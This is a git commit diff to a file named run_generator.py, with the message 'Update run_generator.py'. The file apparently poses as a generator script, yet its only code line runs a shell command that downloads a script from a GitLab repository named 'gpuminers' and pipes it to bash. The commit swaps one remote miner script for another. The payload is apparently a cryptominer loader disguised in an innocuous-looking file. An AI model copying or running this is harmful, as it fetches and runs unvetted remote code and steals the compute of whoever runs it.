e7ca9896be1e320538a211d49402c35ba8292c25
sidwellrakuten <92537490+sidwellrakuten@users.noreply.github.com>
2021-10-15 12:35:58 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/install_dorowu.sh | bash")
+alpha.system("apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_wine_erg_no_ws.sh | bash")
